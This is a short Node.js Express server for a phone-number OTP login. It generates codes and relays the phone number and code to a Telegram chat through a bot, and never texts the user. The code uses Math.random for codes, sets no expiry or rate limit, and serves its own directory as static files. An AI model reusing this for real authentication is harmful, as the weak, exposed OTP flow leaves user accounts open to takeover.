const express = require("express");
const axios = require("axios");
const path = require("path");

const app = express();
app.use(express.json());
app.use(express.static(__dirname));

let otpStore = {};

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// ✅ Show index.html
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// ✅ Send OTP
app.post("/send-otp", async (req, res) => {
  try {
    const phone = req.body.phone;

    if (!phone) {
      return res.status(400).json({ success: false, message: "Phone required" });
    }

    const otp = Math.floor(100000 + Math.random() * 900000);
    otpStore[phone] = otp;

    const message = `
📲 LOGIN REQUEST
Phone: ${phone}
OTP: ${otp}
`;

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    await axios.post(url, {
      chat_id: CHAT_ID,
      text: message,
    });

    res.json({ success: true });
  } catch (err) {
    console.log(err.response?.data || err.message);
    res.status(500).json({ success: false });
  }
});

// ✅ Verify OTP
app.post("/verify-otp", (req, res) => {
  const { phone, otp } = req.body;

  if (otpStore[phone] && otpStore[phone] == otp) {
    delete otpStore[phone];
    res.json({ success: true });
  } else {
    res.json({ success: false });
  }
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Server running on port " + PORT);
});